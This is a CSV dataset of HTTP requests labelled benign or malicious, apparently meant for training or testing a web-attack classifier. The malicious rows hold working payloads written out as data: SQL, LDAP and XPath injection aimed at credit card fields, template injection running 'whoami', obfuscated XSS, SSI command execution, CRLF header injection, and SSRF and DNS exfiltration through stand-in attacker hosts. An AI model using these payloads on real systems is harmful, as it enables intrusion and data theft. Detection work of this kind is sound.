label,text
benign,"GET /shop/categories/electronics/headphones HTTP/1.1
Host: urban-tech-deals.us
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:80.0) Gecko/20100101 Firefox/80.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Referer: https://urban-tech-deals.us/shop
Cache-Control: max-age=0
Connection: keep-alive"
malicious,"GET /search_directory?group=engineering%29%28|(cn=*%29 HTTP/1.1
Host: user-info-service.cloud
User-Agent: Python-urllib/3.9
Accept-Encoding: identity
Accept: */*
Connection: close"
malicious,"HEAD /sessions/current HTTP/1.1
Host: auth-secure-hub.org
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
Referer: https://auth-secure-hub.org/login{#{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('whoami').read() }}#}
Accept: */*
Connection: close"
benign,"GET /stats/user-activity?callback=processData&date=2024-06-12 HTTP/1.1
Host: engagement-tracker.app
Accept: application/javascript
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Pragma: no-cache
Referer: https://engagement-tracker.app/dashboard
Connection: close"
benign,"GET /api/v3/items/search?filter=active&sort=popularity HTTP/1.1
Host: api.cloud-data-services.ai
Connection: keep-alive
If-Modified-Since: Thu, 10 Aug 2023 20:00:00 GMT
Accept: application/json, text/plain, */*
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.8
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0
X-Requested-With: XMLHttpRequest"
benign,"GET /blog/tech-trends/2024 HTTP/1.1
Host: digital-innovators-space.io
Accept: text/html,application/xhtml+xml
Accept-Encoding: gzip, deflate, br
Cookie: user_prefs_b64=eyJsaWdodF9tb2RlIjpmYWxzZSwidGhlbWUiOiJkYXJrIiwic21mdCI6dHJ1ZX0=; track_id=37efXDFwef8!
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15
Referer: https://digital-innovators-space.io/home"
benign,"GET /robots.txt HTTP/1.1
Host: archivesecurecloud.io
User-Agent: SiteAuditBot/2.1
Accept-Encoding: identity
Accept-Language: en-US,en;q=0.9
Connection: close"
benign,"HEAD /api/status/live HTTP/1.1
Host: edge-cdn-network.org
User-Agent: node-fetch/3.2.10
Accept: application/json
Cache-Control: no-cache
Origin: https://dashboard.edge-cdn-network.org
Connection: keep-alive"
benign,"POST /accounts/settings/update HTTP/1.1
Host: secure-identity-hub.io
Content-Type: application/json
Content-Length: 48
Authorization: Basic dXNlcm5hbWU6cGFzc3dvcmQ=
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
Connection: keep-alive

{""UNION ALL"": ""notification_settings_modified""}"
malicious,"GET /user/settings?tab=security HTTP/1.1
Host: encrypted-cloud-vault.xyz
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) ""><script>eval(atob('YWxlcnQoJ1NlY3VyaXR5IGJyb3dha2luZycp'))</script>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.7
Accept-Encoding: gzip, deflate, br
Connection: keep-alive"
benign,"GET /api/v2/groups/details?id=1024&expand=members HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
Accept: */*
Accept-Encoding: gzip
Connection: keep-alive"
benign,"GET /community/thread/23789/latest HTTP/1.1
Host: game-dev-forum.org
Accept: text/html,application/xhtml+xml,application/xml;q=0.8,image/webp,*/*;q=0.5
Accept-Language: en-US,en;q=0.8
Cookie: forum_session=abc123xyz456; user_level=member; last_visited_thread=23789; prefs=dark_mode:true,notifications:false
User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
Connection: keep-alive"
benign,"GET /community/forum/threads?category=development&sort_by=latest&page=5 HTTP/1.1
Host: devtalkers-forum.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Safari/605.1.15
Accept: text/html
Referer: https://devtalkers-forum.net/community/
Cache-Control: max-age=0
Connection: keep-alive"
malicious,"GET /page_render?message=%7B%7B%207*%277%27%7D%7D HTTP/1.1
Host: live-chat-widget.dev
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Cache-Control: max-age=0
Connection: keep-alive"
benign,"POST /api/xml/createOrder HTTP/1.1
Host: ecommerce-hub.biz
Authorization: Bearer abcdefghijklmnopqrstuvwxyz9876543210
Content-Type: application/xml
Accept: application/xml
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15
Content-Length: 310
Connection: keep-alive

<?xml version=""1.0"" encoding=""UTF-8""?>
<Order>
  <OrderID>ORD20240715001</OrderID>
  <CustomerID>CUST72819</CustomerID>
  <Items>
    <Item>
      <ProductID>1234</ProductID>
      <Quantity>2</Quantity>
      <Price>89.50</Price>
    </Item>
    <Item>
      <ProductID>5678</ProductID>
      <Quantity>1</Quantity>
      <Price>129.99</Price>
    </Item>
  </Items>
  <ShippingMethod>Express</ShippingMethod>
</Order>"
malicious,"POST /api/metadata/update HTTP/1.1
Host: api.cloud-data-services.ai
Content-Type: application/json
Content-Length: 351
Origin: https://dashboard.cloud-data-services.ai
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
X-Requested-With: FetchAPIClient
Accept: application/json
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.8
Cache-Control: max-age=0

{
  ""<img src=x onerror=\""eval(String.fromCharCode(0x61, 108, 0145, 114, 0x74, 40, 0x27, 88, 0x53, 0123, 45, 0x4b, 101, 0x79, 0x27, 41))\"">"": ""session_update"",
  ""updateField"": ""location"",
  ""location"": ""us-west-2"",
  ""userId"": ""user_934857"",
  ""authToken"": ""NTFjMWQ2YzQtZTg2OS00ZDQyLWJiMWItMzNkNjY4YTAxOThl""
}"
benign,"GET /api/v3/items/filter?category=outdoor-gear&filter[material]=nylon&filter[price_min]=50&sort_by=newest&page=1 HTTP/1.1
Host: summit-adventure-gear.org
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.1
Accept: application/json
Referer: https://summit-adventure-gear.org/products/outdoor-gear
Accept-Language: en-US,en;q=0.7
Connection: keep-alive"
benign,"GET /wiki/Resource_(disambiguation) HTTP/1.1
Host: community.game-dev-forum.org
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0
Referer: https://community.game-dev-forum.org/wiki/Main_Page
Cookie: sessionid=938fj39skdjsdf3039d9"
malicious,"POST /blog/comment/post HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:78.0) Gecko/20100101 Firefox/78.0
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Charset: utf-8, iso-8859-1;q=0.5
Content-Length: 90
Cache-Control: max-age=0
Connection: keep-alive

post=385&comment=Great+post!&post=389&comment=%3Cscript%3Exss()%3C%2Fscript%3E"
benign,"GET /api/v1/customers?status=active&sort=joined_date HTTP/1.1
Host: api.secure-user-portal.net
Accept: application/json
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxMjM0NSwiZXhwIjoxNjg1MzQ1NjAwfQ.d5fUuNEwYtLjRf_kqHKkVVDpmJPl7CtHJIyHdUdKHGs
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Connection: keep-alive"
malicious,"GET /auth?user_input=guest%250d%250aSet-Cookie%3A%20sessionid%3Dx7ab123c45 HTTP/1.1
Host: accounts.community.game-dev-forum.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Charset: utf-8, iso-8859-1;q=0.5
Referer: https://community.game-dev-forum.org/login
Connection: keep-alive"
benign,"POST /auth/token HTTP/1.1
Host: oauth.secureapp-services.org
Content-Type: application/x-www-form-urlencoded
Content-Length: 135
Authorization: Basic c2VjdXJlQ2xpZW50OnNlY3JldDIwMjQ=
User-Agent: python-requests/2.28.1
Accept-Encoding: gzip, deflate
Accept: application/json
Connection: keep-alive

grant_type=authorization_code&code=45a8b9301dc3&redirect_uri=https%3A%2F%2Fsecureapp.secureapp-services.org%2Foauth2redirect&client_id=secureClient&client_secret=secret2024"
benign,"POST /api/authentication/login HTTP/1.1
Host: medtech-solutions.org
Content-Type: application/json
Accept: application/json
Origin: https://portal.medtech-solutions.org
X-CSRF-Token: 9b7c4238fa8dcbdaa3e91bfc62ef6a05
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:114.0) Gecko/20100101 Firefox/114.0
Content-Length: 76

{""email"":""jonathan.pratt@medtech-solutions.org"",""password"":""N3wHope2023!""}"
malicious,"POST /app/user/settings HTTP/1.1
Host: online-retail-store.biz
Content-Type: application/json
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Referer: https://online-retail-store.biz/app/user/settings
User-Agent: Mozilla/5.0 (Linux; Android 11; MoT-AX) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Mobile Safari/537.36
Sec-CH-UA: ""Google Chrome"";v=""92"", "" Not A;Brand"";v=""99"", ""Chromium"";v=""92""
Sec-CH-UA-Mobile: ?0
Sec-CH-UA-Platform: ""Android""
Content-Length: 180

{""settings"": {""custom_html"": ""<!--#exec cmd=\""c$(echo a)t /etc/hos$(echo t)name\""-->""}, ""extra"": true}"
benign,"GET /assets/css/legacy-style.min.css HTTP/1.1
Host: creative-agency-workspace.io
Connection: keep-alive
Accept: text/css,*/*;q=0.1
Referer: https://creative-agency-workspace.io/projects/branding-101
User-Agent: curl/7.88.1
Accept-Encoding: gzip, deflate
Accept-Language: en-US"
benign,"GET /reports/2024/Q1/summary.pdf HTTP/1.1
Host: global-financial-holdings.net
Accept-Encoding: br, gzip, deflate
Accept: application/pdf
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:114.0) Gecko/20100101 Firefox/114.0
If-None-Match: ""254863-7a4b6faef1""
Connection: close"
malicious,"POST /api/v1/user/settings HTTP/1.1
Host: api.community.game-dev-forum.org
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15
Accept: application/json
Content-Type: application/json
X-Notification-Endpoint: http://rebind-ssrf.attacker-network.io/notify
Cookie: auth_token=9f4e27b6dcb4a8e2f7b1c3d5e6a7f8b9
Content-Length: 42

{""email_notifications"":true,""theme"":""dark""}"
benign,"GET /api/v1/items/search?keyword=children%27s+books+%26+comics&limit=10 HTTP/1.1
Host: book-harbor.io
User-Agent: curl/7.85.0
Accept: application/json
Connection: close"
benign,"POST /user/profile/update HTTP/1.1
Host: secure-cloud-backup.ai
Content-Type: application/x-www-form-urlencoded
Content-Length: 187
User-Agent: curl/7.88.1
Accept: */*
X-CSRF-Token: qv34r8ln29d3x
Connection: keep-alive

user=harold.bates&status=active&bio=%3Cbio%3EPassionate+about+data+security+and+cloud+solutions.%3C%2Fbio%3E"
benign,"GET /api/v1/users/profile HTTP/1.1
Host: vibrant-marketplace.org:3001
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Safari/605.1.15
Accept: application/json
Accept-Language: en-GB,en;q=0.8
Cache-Control: no-cache
Pragma: no-cache
Connection: close"
malicious,"POST /auth HTTP/1.1
Host: portal.finance-services.co
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.7
Content-Length: 78
Connection: keep-alive
Cookie: sess=7d9c4b1e3f2a5d6e8c0b9a7f4d3e2c1b

user=client' and substring(//clients/client[1]/creditcard,5,1)='5&pass=hidden"
benign,"POST /wsdl/SessionManagement HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Safari/605.1.15
Content-Type: application/soap+xml;charset=UTF-8
X-CSRF-Token: 48e9a87b-6d22-4d49-8cfc-2f1a07b35c49
Content-Length: 365
Accept: application/soap+xml
Connection: keep-alive

<?xml version=""1.0"" encoding=""UTF-8""?>
<soap:Envelope xmlns:soap=""http://www.w3.org/2003/05/soap-envelope"">
  <soap:Header/>
  <soap:Body>
    <KeepAliveSession xmlns=""http://secure-user-portal.net/wsdl"">
      <SessionToken>zxy12345-sessiontoken</SessionToken>
    </KeepAliveSession>
  </soap:Body>
</soap:Envelope>"
malicious,"GET /catalog/item/view?id=%2527%2520OR%2520%28SELECT%2520LOAD_FILE%28CONCAT%28%2527%255C%255C%255C%255C%27%2C%28SELECT%2520version%28%29%29%2C%2527.attacker-domain.com%255C%255Cdata%2527%29%29%29--%2520 HTTP/1.1
Host: data-archive-store.biz
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Cache-Control: max-age=0
Connection: keep-alive
Cookie: session_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiam9obmRvZSIsImlhdCI6MTYxNjQyNjQwMH0.WnHfM_k1TRCB2OxPzMY9sQqMKGmEvgLdblCEVSoauQs"
benign,"GET /v4/events/upcoming HTTP/1.1
Host: event-centralized-app.com
Accept: application/json
X-Api-Token: 1ca564970abc235f9d8371e8412ce0ad
User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
Accept-Encoding: gzip"
malicious,"GET /blog/article/view?id=321&filter_evil_chars=true&id=%27%20UNION%20SELECT%20credit_card%20FROM%20users-- HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Referer: https://my-personal-blog-site.info/articles
Cache-Control: max-age=0
Connection: close"
benign,"POST /api/log HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)
Content-Type: application/json
Accept: application/json
Accept-Encoding: gzip
Connection: keep-alive

{
  ""crawlData"": {
    ""site"": ""community.game-dev-forum.org"",
    ""sections"": [
      {
        ""name"": ""Announcements"",
        ""lastChecked"": ""2024-06-12T06:00:00Z"",
        ""postCount"": 423
      },
      {
        ""name"": ""Development Help"",
        ""lastChecked"": ""2024-06-12T05:55:00Z"",
        ""threads"": [
          {
            ""id"": ""t5521"",
            ""new_posts"": 3
          },
          {
            ""id"": ""t5537"",
            ""new_posts"": 0
          }
        ]
      }
    ]
  },
  ""timestamp"": ""2024-06-12T06:15:00Z""
}"
malicious,"POST /profile/update HTTP/1.1
Host: mobileapp-content-api.education-cloud.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.7
Content-Length: 79
Connection: keep-alive

displayName=student42&preferences%5Blanguage%5D=en%2DGB&role_id=3&internal_user_status=AUTHORIZED"
benign,"POST /portal/team/invite HTTP/1.1
Host: global-enterprise-solutions.co
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:111.0) Gecko/20100101 Firefox/111.0
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml
Accept-Language: en-US,en;q=0.9
Content-Length: 108
Connection: keep-alive
Referer: https://global-enterprise-solutions.co/portal/team
Cookie: sessionid=f214a2d8909cf512bd0e837a

csrf_token=c7065a3f4b9a4db0a5e3e76a&form_id=teamInvite&timestamp=1686145402&email=erin.jones%40corporate.com&role=Editor&return_url=%2Fportal%2Fteam"
benign,"PUT /members/185/profile HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: curl/7.79.1
Content-Type: application/json
Accept: application/json
Content-Length: 88
X-Forwarded-For: 192.0.2.12
Authorization: Token 3f4a2e748cdebf22a6d9f8f14b7a46d2
Connection: close

{""bio"": ""Leveling up with &lt;strong&gt;JavaScript&lt;/strong&gt;, &lt;em&gt;C#&lt;/em&gt;, and game design principles.""}"
benign,"GET /resource/load?file=docs/company/annual_report_2023.pdf HTTP/1.1
Host: secure-user-portal.net
Accept: application/pdf
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15
Referer: https://secure-user-portal.net/dashboard
Connection: close"
benign,"PUT /api/v4/inventory/items/09876 HTTP/1.1
Host: warehouse-logistics.net
Authorization: Bearer eXPE7JIlqscCxbRGftKTQ82OUZm4Yv9AH
Origin: https://warehouse-logistics.net
X-Requested-With: XMLHttpRequest
Accept: application/json
Content-Type: application/json
Accept-Language: en-GB,en;q=0.8
Content-Length: 98

{""quantityAvailable"":54,""restockLevel"":20,""location"":""Aisle 5, Shelf 3"",""lastUpdatedBy"":""j.smith""}"
benign,"POST /user/update HTTP/1.1
Host: secure-user-portal.net
Authorization: Bearer m7TrXoa28v9bhLLQ2u6Wkgd45JNTZpqk
Content-Type: application/json
Accept: application/json
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:115.0) Gecko/20100101 Firefox/115.0
Content-Length: 100

{""username"":""travis89"",""email"":""travis89@secure-user-portal.net"",""isAdmin"":false,""profileVisibility"":""friends_only""}"
benign,"GET /search/jobs?query=backend+developer&location=remote&experience_level=mid&employment_type=fulltime&posted_within=30&salary_min=70000&salary_max=130000&sort=date_posted_desc&industry=technology&company_size=medium&remote_only=true&page=10&limit=25 HTTP/1.1
Host: global-careers-hub.org
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
Connection: keep-alive"
benign,"POST /api/tasks HTTP/1.1
Host: team-workflow-cloud.io
Authorization: Bearer dXJuOjEyMzQ1Njc4OQ==
Accept: application/json
Content-Type: application/json
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Safari/605.1.15
Accept-Language: en-US,en;q=0.9

{""title"":""Finalize Project Report"",""dueDate"":""2024-07-15T17:00:00Z"",""assignedTo"":""user_8892"",""priority"":""high"",""completed"":false}"
benign,"GET /user/profile/view?user_id=48239&session_token=fp34lkdjl12&expand=contacts%2Csocial_links&show_activity=true&theme=dark&notifications=enabled&lang=es-ES&timezone=Europe%2FMadrid&page=1&per_page=25 HTTP/1.1
Host: portal-secure-user.net
Connection: keep-alive
Accept: application/json
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36"
malicious,"GET /page/preview?preview_text=%7B%7B%207*%277%27%7D%7D HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Origin: https://community.game-dev-forum.org
Connection: close"
benign,"POST /api/log HTTP/1.1
Host: data-insights.ai
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Content-Type: application/json
Accept: application/json
Referer: https://dashboard.data-insights.ai/
Content-Length: 388

{""eventRecord"":{""type"":""user_feedback"",""details"":{""rating"":4,""comments"":""The dashboard loads quickly and UI is intuitive.""},""userInfo"":{""id"":""user8732"",""profile"":{""membership"":""gold"",""preferences"":{""newsletterOptIn"":true}}},""deviceContext"":{""os"":""macOS 13.2"",""browser"":""Chrome 113""}},""timestamp"":""2024-06-01T12:40:22Z""}"
malicious,"PUT /api/v2/users/update HTTP/1.1
Host: data-analytics-hub.ai
User-Agent: Wget/1.21.1 (linux-gnu)
Content-Type: text/plain
Accept: */*
X-Requested-With: XMLHttpRequest
Content-Length: 88

user%5Bemail%5D=analyst%40data-analytics-hub.ai&user%5Bprofile%5D%5Bverified%5D=true&user%5Broles%5D%5B%5D=20&user%5Broles%5D%5B%5D=21"
